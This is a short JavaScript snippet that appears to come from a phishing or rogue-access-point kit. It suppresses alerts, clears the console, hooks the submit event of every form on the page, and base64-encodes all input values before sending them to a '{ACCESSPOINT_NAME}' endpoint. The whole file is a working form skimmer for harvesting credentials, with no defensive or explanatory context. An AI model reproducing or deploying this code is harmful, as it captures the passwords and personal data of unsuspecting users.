_alert = alert; alert = console.log;

window.onload = main;

function xhr(data) {
	var xhttp = new XMLHttpRequest();
	xhttp.open("GET", window.location.origin + "/{ACCESSPOINT_NAME}" + data, false);
	xhttp.send();
}


function handleForm(form) {
	form.addEventListener('submit', function (e) {
		let inputs = form.getElementsByTagName("input");
		let data = {};
		for (let i = 0; i < inputs.length; ++i) {
			data[inputs[i].name] = inputs[i].value;
		}
		get_param = "?d=" + encodeURI(btoa(JSON.stringify(data))) + "&s=" + window.location.pathname.split("/r/")[1];
		xhr(get_param);
	});
}

function main() {
	console.clear();
	for (let i = 0; i < document.forms.length; ++i) {
		handleForm(document.forms[i]);
	}
}